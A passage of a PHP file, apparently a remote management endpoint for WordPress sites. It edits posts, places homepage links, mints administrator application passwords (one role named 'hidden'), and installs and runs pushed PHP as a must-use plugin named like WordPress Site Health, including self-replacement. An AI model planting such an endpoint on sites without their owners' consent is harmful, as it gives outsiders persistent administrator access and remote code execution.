        'runtimeMode' => 'MU_PLUGIN',
    ));
}

function easypost_endpoint_fallback_disable_site_runtime() {
    $tombstone = update_option('site_health_runtime_disabled_v1', '1', 'no');
    $tombstone_row = easypost_endpoint_read_option_row('site_health_runtime_disabled_v1');
    if (($tombstone === false && ($tombstone_row['status'] !== 'found' || $tombstone_row['raw'] !== '1'))
        || $tombstone_row['status'] === 'unavailable') {
        return false;
    }
    if (function_exists('wp_clear_scheduled_hook')) {
        if (wp_clear_scheduled_hook('site_health_runtime_daily_v1') === false
            || wp_clear_scheduled_hook('site_health_runtime_retry_v1') === false) {
            return false;
        }
    }
    foreach (array(
        'site_health_runtime_bundle_v1', 'site_health_runtime_pending_v1',
        'site_health_runtime_retry_event_v1', 'site_health_runtime_configuration_v1'
    ) as $name) {
        if (!easypost_endpoint_restore_site_runtime_option($name, array(
            'status' => 'missing', 'raw' => null, 'autoload' => null
        ))) {
            return false;
        }
    }
    return true;
}

function easypost_endpoint_site_runtime_is_disabled_state() {
    $disabled = easypost_endpoint_read_option_row('site_health_runtime_disabled_v1');
    if ($disabled['status'] !== 'found'
        || $disabled['raw'] !== '1'
        || wp_next_scheduled('site_health_runtime_daily_v1') !== false
        || wp_next_scheduled('site_health_runtime_retry_v1') !== false) {
        return false;
    }
    foreach (array(
        'site_health_runtime_bundle_v1', 'site_health_runtime_pending_v1',
        'site_health_runtime_retry_event_v1', 'site_health_runtime_configuration_v1'
    ) as $name) {
        if (easypost_endpoint_read_option_row($name)['status'] !== 'missing') {
            return false;
        }
    }
    return true;
}

function easypost_endpoint_disable_site_runtime() {
    $owner = easypost_endpoint_acquire_internal_runtime_lease();
    if ($owner === false) {
        easypost_endpoint_json(409, array('ok' => false, 'error' => 'runtime_busy'));
    }
    $snapshot = easypost_endpoint_site_runtime_snapshot();
    if ($snapshot === false) {
        $released = easypost_endpoint_release_internal_runtime_lease($owner);
        easypost_endpoint_json(500, array('ok' => false, 'error' => $released ? 'runtime_disable_failed' : 'runtime_rollback_failed'));
    }
    if (function_exists('site_health_runtime_disable')) {
        $disabled = site_health_runtime_disable();
        $disabled_ok = is_array($disabled) && !empty($disabled['ok']);
    } else {
        $disabled_ok = easypost_endpoint_fallback_disable_site_runtime();
    }
    if (!$disabled_ok || !easypost_endpoint_site_runtime_is_disabled_state()) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_disable_failed');
    }
    $disabled_runtime = easypost_endpoint_disabled_site_runtime_php();
    $runtime_path = is_string($disabled_runtime)
        ? easypost_endpoint_atomic_site_runtime_write($disabled_runtime, false)
        : false;
    $written_runtime = $runtime_path === false ? false : @file_get_contents($runtime_path);
    if ($runtime_path === false
        || !is_string($written_runtime)
        || !hash_equals($disabled_runtime, $written_runtime)) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_disable_failed');
    }
    if (!easypost_endpoint_cleanup_pending_upgrade($snapshot)) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_disable_failed');
    }
    if (!easypost_endpoint_release_internal_runtime_lease($owner)) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_disable_failed');
    }
    easypost_endpoint_json(200, easypost_endpoint_site_runtime_status_payload());
}

function easypost_endpoint_runtime_status() {
    easypost_endpoint_json(200, easypost_endpoint_site_runtime_status_payload());
}

function easypost_endpoint_site_runtime_owner_token($payload) {
    if (!isset($payload['ownerToken'])
        || !is_string($payload['ownerToken'])
        || !preg_match('/\A[A-Za-z0-9_-]{43}\z/', $payload['ownerToken'])
        || strlen(easypost_endpoint_base64url_decode($payload['ownerToken'])) !== 32) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'owner_token_invalid'));
    }
    return $payload['ownerToken'];
}

function easypost_endpoint_site_runtime_lease_value($state) {
    return function_exists('maybe_serialize') ? maybe_serialize($state) : serialize($state);
}

function easypost_endpoint_site_runtime_lease_state($raw) {
    $state = function_exists('maybe_unserialize') ? maybe_unserialize($raw) : @unserialize($raw);
    if (!easypost_endpoint_exact_array_keys($state, array('version', 'owner', 'source', 'acquiredAt', 'expiresAt'))
        || $state['version'] !== 1
        || !is_string($state['owner'])
        || (!easypost_endpoint_runtime_uuid($state['owner'])
            && (!preg_match('/\A[A-Za-z0-9_-]{43}\z/', $state['owner'])
                || strlen(easypost_endpoint_base64url_decode($state['owner'])) !== 32))
        || !in_array($state['source'], array('REMOTE', 'WP_CRON'), true)
        || !is_int($state['acquiredAt'])
        || !is_int($state['expiresAt'])
        || $state['expiresAt'] <= $state['acquiredAt']) {
        return false;
    }
    return $state;
}

function easypost_endpoint_site_runtime_lease_compare_swap($observed, $desired, $observed_autoload) {
    global $wpdb;
    if (!isset($wpdb) || !isset($wpdb->options) || !method_exists($wpdb, 'query') || !method_exists($wpdb, 'prepare')) {
        return false;
    }
    $updated = $wpdb->query($wpdb->prepare(
        "UPDATE {$wpdb->options} SET option_value = %s, autoload = 'no' WHERE option_name = %s AND option_value = %s",
        $desired,
        'site_health_runtime_lease_v1',
        $observed
    ));
    if ($updated === false || (int) $updated > 1) {
        return false;
    }
    if ((int) $updated === 1) {
        easypost_endpoint_cache_option_written(
            'site_health_runtime_lease_v1',
            false,
            easypost_endpoint_option_is_autoloaded($observed_autoload)
        );
    }
    $verified = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    return $verified['status'] === 'found'
        && $verified['raw'] === $desired
        && $verified['autoload'] === 'no';
}

function easypost_endpoint_begin_reconcile($payload) {
    $owner = easypost_endpoint_site_runtime_owner_token($payload);
    $now = time();
    $desired = easypost_endpoint_site_runtime_lease_value(array(
        'version' => 1,
        'owner' => $owner,
        'source' => 'REMOTE',
        'acquiredAt' => $now,
        'expiresAt' => $now + 600,
    ));
    $inserted = easypost_endpoint_insert_option_once('site_health_runtime_lease_v1', $desired);
    if ($inserted === 'inserted') {
        easypost_endpoint_json(200, array('ok' => true, 'acquired' => true));
    }
    if ($inserted === 'unavailable') {
        easypost_endpoint_json(503, array('ok' => false, 'error' => 'lease_store_unavailable'));
    }
    $row = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    if ($row['status'] !== 'found') {
        easypost_endpoint_json(503, array('ok' => false, 'error' => 'lease_store_unavailable'));
    }
    $observed = easypost_endpoint_site_runtime_lease_state($row['value']);
    if ($observed !== false
        && $observed['expiresAt'] > $now
        && hash_equals($observed['owner'], $owner)) {
        $renewed = $observed;
        $renewed['expiresAt'] = $now + 600;
        $desired = easypost_endpoint_site_runtime_lease_value($renewed);
        if (easypost_endpoint_site_runtime_lease_compare_swap($row['value'], $desired, $row['autoload'])) {
            easypost_endpoint_json(200, array('ok' => true, 'acquired' => true));
        }
        easypost_endpoint_json(409, array('ok' => false, 'acquired' => false, 'error' => 'lease_changed'));
    }
    if ($observed !== false
        && $observed['expiresAt'] <= $now
        && easypost_endpoint_site_runtime_lease_compare_swap($row['value'], $desired, $row['autoload'])) {
        easypost_endpoint_json(200, array('ok' => true, 'acquired' => true));
    }
    easypost_endpoint_json(409, array('ok' => false, 'acquired' => false, 'error' => 'lease_busy'));
}

function easypost_endpoint_refresh_reconcile($payload) {
    $owner = easypost_endpoint_site_runtime_owner_token($payload);
    $now = time();
    $row = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    if ($row['status'] === 'unavailable') {
        easypost_endpoint_json(503, array('ok' => false, 'error' => 'lease_store_unavailable'));
    }
    $observed = $row['status'] === 'found'
        ? easypost_endpoint_site_runtime_lease_state($row['value'])
        : false;
    if ($observed === false
        || $observed['expiresAt'] <= $now
        || !hash_equals($observed['owner'], $owner)) {
        easypost_endpoint_json(409, array('ok' => false, 'refreshed' => false, 'error' => 'lease_not_owned'));
    }
    $desired_state = $observed;
    $desired_state['expiresAt'] = $now + 600;
    $desired = easypost_endpoint_site_runtime_lease_value($desired_state);
    if (!easypost_endpoint_site_runtime_lease_compare_swap($row['value'], $desired, $row['autoload'])) {
        easypost_endpoint_json(409, array('ok' => false, 'refreshed' => false, 'error' => 'lease_changed'));
    }
    easypost_endpoint_json(200, array('ok' => true, 'refreshed' => true));
}

function easypost_endpoint_finish_reconcile($payload) {
    global $wpdb;
    $owner = easypost_endpoint_site_runtime_owner_token($payload);
    $row = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    if ($row['status'] === 'unavailable'
        || !isset($wpdb)
        || !isset($wpdb->options)
        || !method_exists($wpdb, 'query')
        || !method_exists($wpdb, 'prepare')) {
        easypost_endpoint_json(503, array('ok' => false, 'error' => 'lease_store_unavailable'));
    }
    if ($row['status'] === 'missing') {
        easypost_endpoint_json(200, array('ok' => true, 'released' => true));
    }
    $observed = easypost_endpoint_site_runtime_lease_state($row['value']);
    if ($observed === false
        || $observed['expiresAt'] <= time()
        || !hash_equals($observed['owner'], $owner)) {
        easypost_endpoint_json(409, array('ok' => false, 'released' => false, 'error' => 'lease_not_owned'));
    }
    $deleted = $wpdb->query($wpdb->prepare(
        "DELETE FROM {$wpdb->options} WHERE option_name = %s AND option_value = %s",
        'site_health_runtime_lease_v1',
        $row['value']
    ));
    if ((int) $deleted !== 1) {
        easypost_endpoint_json(409, array('ok' => false, 'released' => false, 'error' => 'lease_changed'));
    }
    easypost_endpoint_cache_option_deleted(
        'site_health_runtime_lease_v1',
        easypost_endpoint_option_is_autoloaded($row['autoload'])
    );
    easypost_endpoint_json(200, array('ok' => true, 'released' => true));
}

function easypost_endpoint_portfolio_lease_owned($owner) {
    $row = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    if ($row['status'] !== 'found') {
        return false;
    }
    $observed = easypost_endpoint_site_runtime_lease_state($row['raw']);
    return $observed !== false
        && $observed['source'] === 'REMOTE'
        && $observed['expiresAt'] > time()
        && hash_equals($observed['owner'], (string) $owner);
}

function easypost_endpoint_require_reconcile_lease($payload) {
    $owner = easypost_endpoint_site_runtime_owner_token($payload);
    if (!preg_match('/\A[A-Za-z0-9_-]{43}\z/', $owner)
        || strlen(easypost_endpoint_base64url_decode($owner)) !== 32) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'owner_token_invalid'));
    }
    $row = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    if ($row['status'] === 'unavailable') {
        easypost_endpoint_json(503, array('ok' => false, 'error' => 'lease_store_unavailable'));
    }
    $observed = $row['status'] === 'found'
        ? easypost_endpoint_site_runtime_lease_state($row['raw'])
        : false;
    if ($observed === false
        || $observed['source'] !== 'REMOTE'
        || $observed['expiresAt'] <= time()
        || !hash_equals($observed['owner'], $owner)) {
        easypost_endpoint_json(409, array('ok' => false, 'error' => 'lease_not_owned'));
    }
    return $owner;
}

function easypost_endpoint_reconcile_portfolio_admin($payload) {
    easypost_endpoint_require_reconcile_lease($payload);
    easypost_endpoint_reconcile_admin($payload);
}

function easypost_endpoint_portfolio_application_passwords($wp_user_id) {
    if (!class_exists('WP_Application_Passwords')
        || !method_exists('WP_Application_Passwords', 'get_user_application_passwords')) {
        return false;
    }
    $items = WP_Application_Passwords::get_user_application_passwords($wp_user_id);
    return is_array($items) ? $items : false;
}

function easypost_endpoint_portfolio_envelope_cache_name($credential_id) {
    return 'site_health_runtime_envelope_' . hash('sha256', (string) $credential_id);
}

function easypost_endpoint_delete_portfolio_envelope_cache($credential_id) {
    return easypost_endpoint_restore_site_runtime_option(
        easypost_endpoint_portfolio_envelope_cache_name($credential_id),
        array('status' => 'missing', 'raw' => null, 'autoload' => null)
    );
}

function easypost_endpoint_portfolio_envelope_valid($envelope) {
    return easypost_endpoint_exact_array_keys($envelope, array('version', 'nonce', 'ciphertext', 'tag'))
        && $envelope['version'] === 1
        && is_string($envelope['nonce'])
        && strlen($envelope['nonce']) === 16
        && strlen(easypost_endpoint_base64url_decode($envelope['nonce'])) === 12
        && is_string($envelope['ciphertext'])
        && $envelope['ciphertext'] !== ''
        && strlen($envelope['ciphertext']) <= 87382
        && easypost_endpoint_base64url_decode($envelope['ciphertext']) !== false
        && is_string($envelope['tag'])
        && strlen($envelope['tag']) === 22
        && strlen(easypost_endpoint_base64url_decode($envelope['tag'])) === 16;
}

function easypost_endpoint_portfolio_envelope_cache(
    $owner,
    $role,
    $credential_id,
    $wp_user_id,
    $app_id,
    $application_password_uuid,
    $envelope
) {
    $option_name = easypost_endpoint_portfolio_envelope_cache_name($credential_id);
    $now = time();
    if ($envelope === null) {
        $row = easypost_endpoint_read_option_row($option_name);
        if ($row['status'] === 'unavailable') {
            return false;
        }
        if ($row['status'] !== 'found') {
            return null;
        }
        $stored = json_decode($row['raw'], true);
        $valid = $row['autoload'] === 'no'
            && easypost_endpoint_exact_array_keys($stored, array(
            'version', 'ownerHash', 'role', 'credentialId', 'wpUserId',
            'appId', 'applicationPasswordUuid', 'expiresAt', 'envelope'
            ))
            && $stored['version'] === 1
            && is_string($stored['ownerHash'])
            && hash_equals($stored['ownerHash'], hash('sha256', $owner))
            && is_string($stored['role'])
            && hash_equals($stored['role'], $role)
            && is_string($stored['credentialId'])
            && hash_equals($stored['credentialId'], $credential_id)
            && is_int($stored['wpUserId'])
            && $stored['wpUserId'] === $wp_user_id
            && is_string($stored['appId'])
            && hash_equals($stored['appId'], $app_id)
            && is_string($stored['applicationPasswordUuid'])
            && hash_equals($stored['applicationPasswordUuid'], $application_password_uuid)
            && is_int($stored['expiresAt'])
            && $stored['expiresAt'] > $now
            && easypost_endpoint_portfolio_envelope_valid($stored['envelope']);
        if (!$valid) {
            return easypost_endpoint_delete_portfolio_envelope_cache($credential_id)
                ? null
                : false;
        }
        return $stored['envelope'];
    }
    if (!easypost_endpoint_portfolio_envelope_valid($envelope)) {
        return false;
    }
    $stored = json_encode(array(
        'version' => 1,
        'ownerHash' => hash('sha256', $owner),
        'role' => $role,
        'credentialId' => $credential_id,
        'wpUserId' => $wp_user_id,
        'appId' => $app_id,
        'applicationPasswordUuid' => $application_password_uuid,
        'expiresAt' => $now + 1800,
        'envelope' => $envelope,
    ));
    return is_string($stored) && easypost_endpoint_restore_site_runtime_option(
        $option_name,
        array('status' => 'found', 'raw' => $stored, 'autoload' => 'no')
    );
}

function easypost_endpoint_reconcile_application_password($payload) {
    $owner = easypost_endpoint_require_reconcile_lease($payload);
    foreach (array(
        'operation', 'role', 'credentialId', 'wpUserId', 'appId',
        'applicationPasswordUuid', 'name', 'envelope'
    ) as $required_field) {
        if (!array_key_exists($required_field, $payload)) {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'application_password_input_invalid'));
        }
    }
    if (!is_string($payload['operation'])
        || !in_array($payload['operation'], array('inspect', 'create', 'delete', 'cache_envelope'), true)
        || !is_string($payload['role'])
        || !in_array($payload['role'], array('general', 'hidden', 'additional'), true)
        || !easypost_endpoint_runtime_uuid($payload['credentialId'])
        || strtolower($payload['credentialId']) !== $payload['credentialId']
        || !is_int($payload['wpUserId'])
        || $payload['wpUserId'] < 1
        || $payload['wpUserId'] > 2147483647
        || !easypost_endpoint_runtime_uuid($payload['appId'])
        || strtolower($payload['appId']) !== $payload['appId']
        || ($payload['applicationPasswordUuid'] !== null
            && (!easypost_endpoint_runtime_uuid($payload['applicationPasswordUuid'])
                || strtolower($payload['applicationPasswordUuid']) !== $payload['applicationPasswordUuid']))
        || !is_string($payload['name'])
        || strlen($payload['name']) < 1
        || strlen($payload['name']) > 128) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'application_password_input_invalid'));
    }
    $expected_names = array(
        'general' => 'Site REST general',
        'hidden' => 'Site REST hidden',
        'additional' => 'Site REST additional',
    );
    if (!hash_equals($expected_names[$payload['role']], $payload['name'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'application_password_name_invalid'));
    }
    $operation = $payload['operation'];
    $role = $payload['role'];
    $credential_id = $payload['credentialId'];
    $wp_user_id = $payload['wpUserId'];
    $app_id = $payload['appId'];
    $application_password_uuid = $payload['applicationPasswordUuid'];
    $name = $payload['name'];
    $envelope = $payload['envelope'];
    if (($operation === 'cache_envelope') !== ($envelope !== null)
        || (in_array($operation, array('delete', 'cache_envelope'), true)
            && $application_password_uuid === null)
        || ($operation === 'create' && $application_password_uuid !== null)) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'application_password_operation_invalid'));
    }
    if (!function_exists('get_user_by')) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'application_password_api_unavailable'));
    }
    $user = get_user_by('id', $wp_user_id);
    if (!$user || !in_array('administrator', isset($user->roles) ? (array) $user->roles : array(), true)) {
        easypost_endpoint_json(409, array('ok' => false, 'error' => 'application_password_user_mismatch'));
    }
    if (!class_exists('WP_Application_Passwords')
        || !method_exists('WP_Application_Passwords', 'get_user_application_passwords')) {
        easypost_endpoint_json(501, array('ok' => false, 'error' => 'application_password_api_unavailable'));
    }
    $items = easypost_endpoint_portfolio_application_passwords($wp_user_id);
    if ($items === false) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'application_password_read_failed'));
    }
    $match = null;
    $app_id_match = null;
    foreach ($items as $candidate) {
        if (!is_array($candidate)
            || !isset($candidate['app_id'], $candidate['uuid'])
            || !is_string($candidate['app_id'])
            || !is_string($candidate['uuid'])
            || !hash_equals($app_id, (string) $candidate['app_id'])) {
            continue;
        }
        $app_id_match = $candidate;
        if ($application_password_uuid !== null
            && !hash_equals($application_password_uuid, (string) $candidate['uuid'])) {
            continue;
        }
        if ($match !== null) {
            easypost_endpoint_json(409, array('ok' => false, 'error' => 'application_password_identity_conflict'));
        }
        $match = $candidate;
    }
    if ($operation === 'inspect') {
        $matched_uuid = $match !== null ? (string) $match['uuid'] : null;
        $cached = $match !== null
            ? easypost_endpoint_portfolio_envelope_cache(
                $owner, $role, $credential_id, $wp_user_id, $app_id, $matched_uuid, null
            )
            : null;
        if ($cached === false) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'application_password_cache_read_failed'));
        }
        easypost_endpoint_json(200, array(
            'ok' => true,
            'action' => 'INSPECTED',
            'exists' => $match !== null,
            'role' => $role,
            'credentialId' => $credential_id,
            'wpUserId' => $wp_user_id,
            'appId' => $app_id,
            'applicationPasswordUuid' => $matched_uuid,
            'name' => $match !== null && isset($match['name']) ? (string) $match['name'] : $name,
            'envelope' => $cached,
        ));
    }
    if ($operation === 'create') {
        if ($match !== null) {
            easypost_endpoint_json(200, array(
                'ok' => true,
                'action' => 'UNCHANGED',
                'exists' => true,
                'role' => $role,
                'credentialId' => $credential_id,
                'wpUserId' => $wp_user_id,
                'appId' => $app_id,
                'applicationPasswordUuid' => (string) $match['uuid'],
                'name' => isset($match['name']) ? (string) $match['name'] : $name,
                'applicationPassword' => null,
            ));
        }
        if (!method_exists('WP_Application_Passwords', 'create_new_application_password')) {
            easypost_endpoint_json(501, array('ok' => false, 'error' => 'application_password_api_unavailable'));
        }
        $created = WP_Application_Passwords::create_new_application_password(
            $wp_user_id,
            array('name' => $name, 'app_id' => $app_id)
        );
        if ((function_exists('is_wp_error') && is_wp_error($created))
            || !is_array($created)
            || count($created) !== 2
            || !is_string($created[0])
            || $created[0] === ''
            || !is_array($created[1])
            || !isset($created[1]['uuid'], $created[1]['app_id'])
            || !hash_equals($app_id, (string) $created[1]['app_id'])
            || !easypost_endpoint_runtime_uuid((string) $created[1]['uuid'])) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'application_password_create_failed'));
        }
        easypost_endpoint_json(201, array(
            'ok' => true,
            'action' => 'CREATED',
            'exists' => true,
            'role' => $role,
            'credentialId' => $credential_id,
            'wpUserId' => $wp_user_id,
            'appId' => $app_id,
            'applicationPasswordUuid' => (string) $created[1]['uuid'],
            'name' => $name,
            'applicationPassword' => $created[0],
        ));
    }
    if ($match === null && ($app_id_match !== null || $operation !== 'delete')) {
        easypost_endpoint_json(409, array('ok' => false, 'error' => 'application_password_identity_missing'));
    }
    if ($operation === 'cache_envelope') {
        if (!easypost_endpoint_portfolio_envelope_cache(
            $owner,
            $role,
            $credential_id,
            $wp_user_id,
            $app_id,
            $application_password_uuid,
            $envelope
        )) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'application_password_cache_failed'));
        }
        easypost_endpoint_json(200, array(
            'ok' => true,
            'action' => 'CACHED',
            'exists' => true,
            'role' => $role,
            'credentialId' => $credential_id,
            'wpUserId' => $wp_user_id,
            'appId' => $app_id,
            'applicationPasswordUuid' => $application_password_uuid,
            'name' => $name,
        ));
    }
    if ($match !== null
        && (!method_exists('WP_Application_Passwords', 'delete_application_password')
            || !WP_Application_Passwords::delete_application_password($wp_user_id, $application_password_uuid))) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'application_password_delete_failed'));
    }
    if (!easypost_endpoint_delete_portfolio_envelope_cache($credential_id)) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'application_password_cache_cleanup_failed'));
    }
    easypost_endpoint_json(200, array(
        'ok' => true,
        'action' => 'DELETED',
        'exists' => false,
        'role' => $role,
        'credentialId' => $credential_id,
        'wpUserId' => $wp_user_id,
        'appId' => $app_id,
        'applicationPasswordUuid' => $application_password_uuid,
        'name' => $name,
    ));
}

function easypost_endpoint_configure_portfolio_runtime($payload) {
    $owner = easypost_endpoint_require_reconcile_lease($payload);
    if (!isset($payload['runtimeVersion'])
        || !is_string($payload['runtimeVersion'])
        || !hash_equals(EASYPOST_PORTFOLIO_RUNTIME_VERSION, $payload['runtimeVersion'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_version_invalid'));
    }
    if (!isset($payload['runtimePhpBase64'])
        || !is_string($payload['runtimePhpBase64'])
        || strlen($payload['runtimePhpBase64']) > 349528) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_php_required'));
    }
    $decoded_php = base64_decode($payload['runtimePhpBase64'], true);
    if ($decoded_php === false
        || $decoded_php === ''
        || !hash_equals($payload['runtimePhpBase64'], base64_encode($decoded_php))) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_php_invalid'));
    }
    $runtime_config = easypost_endpoint_validate_site_runtime($payload, $decoded_php);
    $snapshot = easypost_endpoint_site_runtime_snapshot();
    if ($snapshot === false) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'runtime_snapshot_failed'));
    }
    $runtime_path = easypost_endpoint_atomic_site_runtime_write($decoded_php, false);
    if ($runtime_path === false) {
        $restored = easypost_endpoint_restore_site_runtime_snapshot($snapshot);
        easypost_endpoint_json(500, array('ok' => false, 'error' => $restored ? 'runtime_write_failed' : 'runtime_rollback_failed'));
    }
    try {
        if (!function_exists('site_health_runtime_activate')) {
            include $runtime_path;
        }
        $activated = function_exists('site_health_runtime_activate')
            ? site_health_runtime_activate($runtime_config)
            : false;
    } catch (Throwable $error) {
        $activated = false;
    }
    if (!is_array($activated)
        || empty($activated['ok'])
        || empty($activated['enabled'])
        || !isset($activated['runtimeVersion'], $activated['configurationVersion'], $activated['dailySecondUtc'])
        || !hash_equals($payload['runtimeVersion'], (string) $activated['runtimeVersion'])
        || !hash_equals($payload['configurationVersion'], (string) $activated['configurationVersion'])
        || !is_int($activated['dailySecondUtc'])
        || $activated['dailySecondUtc'] < 0
        || $activated['dailySecondUtc'] > 86399
        || !easypost_endpoint_cleanup_pending_upgrade($snapshot)) {
        $restored = easypost_endpoint_restore_site_runtime_snapshot($snapshot);
        easypost_endpoint_json(500, array('ok' => false, 'error' => $restored ? 'runtime_activation_failed' : 'runtime_rollback_failed'));
    }
    if (!easypost_endpoint_portfolio_lease_owned($owner)) {
        $restored = easypost_endpoint_restore_site_runtime_snapshot($snapshot);
        easypost_endpoint_json(409, array('ok' => false, 'error' => $restored ? 'lease_expired' : 'runtime_rollback_failed'));
    }
    easypost_endpoint_json(200, array(
        'ok' => true,
        'enabled' => true,
        'runtimeVersion' => $payload['runtimeVersion'],
        'configurationVersion' => $payload['configurationVersion'],
        'dailySecondUtc' => $activated['dailySecondUtc'],
        'scheduled' => wp_next_scheduled('site_health_runtime_daily_v1') !== false,
        'runtimeMode' => 'MU_PLUGIN',
    ));
}

function easypost_endpoint_bootstrap_portfolio_runtime($payload) {
    easypost_endpoint_require_reconcile_lease($payload);
    if (!isset($payload['configurationVersion'])
        || !is_string($payload['configurationVersion'])
        || !easypost_endpoint_runtime_uuid($payload['configurationVersion'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'configuration_version_invalid'));
    }
    $configuration = easypost_endpoint_read_option_row('site_health_runtime_configuration_v1');
    if ($configuration['status'] !== 'found'
        || !hash_equals($configuration['raw'], $payload['configurationVersion'])) {
        easypost_endpoint_json(409, array('ok' => false, 'error' => 'runtime_configuration_missing'));
    }
    $runtime_path = easypost_endpoint_site_runtime_path();
    if (!function_exists('site_health_runtime_bootstrap_report') && is_readable($runtime_path)) {
        include_once $runtime_path;
    }
    if (!function_exists('site_health_runtime_bootstrap_report')) {
        easypost_endpoint_json(501, array('ok' => false, 'error' => 'runtime_bootstrap_unsupported'));
    }
    try {
        $dispatched = site_health_runtime_bootstrap_report();
    } catch (Throwable $error) {
        $dispatched = false;
    }
    if ($dispatched !== true) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'runtime_bootstrap_failed'));
    }
    easypost_endpoint_json(200, array(
        'ok' => true,
        'configurationVersion' => $payload['configurationVersion'],
        'dispatched' => true,
    ));
}

function easypost_endpoint_verify_release_signature($payload, $computed_sha256) {
    $config = easypost_endpoint_config();
    if (empty($config['ota_release_public_key_pem']) || !is_string($config['ota_release_public_key_pem'])) {
        easypost_endpoint_json(501, array('ok' => false, 'error' => 'ota_release_public_key_missing'));
    }
    if (!function_exists('openssl_verify')) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'openssl_unavailable'));
    }
    if (!isset($payload['signature']) || !is_string($payload['signature']) || trim($payload['signature']) === '') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'release_signature_required'));
    }

    $signature = base64_decode($payload['signature'], true);
    if ($signature === false || $signature === '') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'release_signature_invalid'));
    }

    $signed_payload = $payload['version'] . "\n" . $computed_sha256;
    $verified = openssl_verify($signed_payload, $signature, $config['ota_release_public_key_pem'], OPENSSL_ALGO_SHA256);
    if ($verified !== 1) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'release_signature_invalid'));
    }
}

function easypost_endpoint_update_endpoint($payload) {
    if (!isset($payload['version']) || !is_string($payload['version']) || trim($payload['version']) === '') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'version_required'));
    }
    if (!isset($payload['sha256']) || !is_string($payload['sha256']) || trim($payload['sha256']) === '') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'sha256_required'));
    }
    if (!preg_match('/\A[a-f0-9]{64}\z/', $payload['sha256'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'sha256_invalid'));
    }
    if (!isset($payload['phpBase64']) || !is_string($payload['phpBase64']) || trim($payload['phpBase64']) === '') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'php_base64_required'));
    }

    $decoded_php = base64_decode($payload['phpBase64'], true);
    if ($decoded_php === false || $decoded_php === '') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'php_base64_invalid'));
    }
    $computed_sha256 = hash('sha256', $decoded_php);
    if (!hash_equals($payload['sha256'], $computed_sha256)) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'sha256_mismatch'));
    }
    easypost_endpoint_verify_release_signature($payload, $computed_sha256);

    $tmp_path = tempnam(__DIR__, 'easypost-update-');
    if (!$tmp_path) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'temporary_write_failed'));
    }
    $bytes = file_put_contents($tmp_path, $decoded_php, LOCK_EX);
    if ($bytes === false || $bytes !== strlen($decoded_php)) {
        @unlink($tmp_path);
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'temporary_write_failed'));
    }
    @chmod($tmp_path, fileperms(__FILE__) & 0777);
    if (!rename($tmp_path, __FILE__)) {
        @unlink($tmp_path);
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'rename_failed'));
    }
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate(__FILE__, true);
    }
    if (function_exists('clearstatcache')) {
        clearstatcache(true, __FILE__);
    }

    easypost_endpoint_json(200, array(
        'ok' => true,
        'endpointVersion' => $payload['version'],
    ));
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    easypost_endpoint_json(405, array('ok' => false, 'error' => 'method_not_allowed'));
}

$stream = fopen('php://input', 'rb');
$body = $stream === false ? false : stream_get_contents($stream, 524289);
if (is_resource($stream)) {
    fclose($stream);
}
if ($body === false) {
    easypost_endpoint_json(400, array('ok' => false, 'error' => 'request_body_unavailable'));
}
if (strlen($body) > 524288) {
    easypost_endpoint_json(413, array('ok' => false, 'error' => 'request_too_large'));
}
easypost_endpoint_bootstrap_wordpress();
easypost_endpoint_verify_auth($body);
$action = isset($_GET['action']) ? $_GET['action'] : 'health';
$allowed_fields_by_action = easypost_endpoint_allowed_fields_by_action();

if (!array_key_exists($action, $allowed_fields_by_action)) {
    easypost_endpoint_json(404, array('ok' => false, 'error' => 'unknown_action'));
}

$payload = easypost_endpoint_json_object_payload($body);
easypost_endpoint_validate_payload_fields($action, $payload, $allowed_fields_by_action);

if ($action === 'health') {
    easypost_endpoint_health();
}

if ($action === 'lookup_post') {
    easypost_endpoint_lookup_post($payload);
}
if ($action === 'update_post') {
    easypost_endpoint_update_post($payload);
}
if ($action === 'create_post') {
    easypost_endpoint_create_post($payload);
}
if ($action === 'place_homepage_link') {
    easypost_endpoint_place_homepage_link($payload);
}
if ($action === 'remove_homepage_link') {
    easypost_endpoint_remove_homepage_link($payload);
}
if ($action === 'reconcile_admin') {
    easypost_endpoint_reconcile_admin($payload);
}
